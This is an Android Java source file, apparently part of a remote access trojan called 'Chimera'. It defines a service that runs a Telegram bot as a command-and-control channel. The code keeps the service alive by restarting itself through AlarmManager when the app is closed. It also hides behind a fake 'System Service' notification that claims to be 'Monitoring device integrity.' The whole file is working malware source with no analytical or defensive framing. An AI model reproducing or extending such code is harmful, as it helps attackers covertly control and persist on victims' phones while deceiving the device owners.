package com.chimera;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

public class TelegramC2Service extends Service {

    private Thread workerThread;
    private final Handler inactivityHandler = new Handler(Looper.getMainLooper());
    private Runnable stopRunnable;
    private static final long INACTIVITY_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes

    private static final String CHANNEL_ID = "ChimeraServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            createNotificationChannel();
            startForeground(NOTIFICATION_ID, createNotification());
            stopRunnable = this::stopSelf;
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_FATAL_ONCREATE", e);
            stopSelf();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ConfigLoader.load(this);
        startWorker();
        resetInactivityTimer();
        return START_STICKY;
    }

    private void startWorker() {
        if (workerThread == null || !workerThread.isAlive()) {
            workerThread = new Thread(new TelegramBotWorker(this, this::resetInactivityTimer));
            workerThread.start();
        }
    }

    public void resetInactivityTimer() {
        inactivityHandler.removeCallbacks(stopRunnable);
        inactivityHandler.postDelayed(stopRunnable, INACTIVITY_TIMEOUT_MS);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (workerThread != null) workerThread.interrupt();
        inactivityHandler.removeCallbacks(stopRunnable);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
        restartIntent.setPackage(getPackageName());
        PendingIntent pi = PendingIntent.getService(getApplicationContext(), 1, restartIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 5000, pi);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Monitoring device integrity.")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build();
    }
}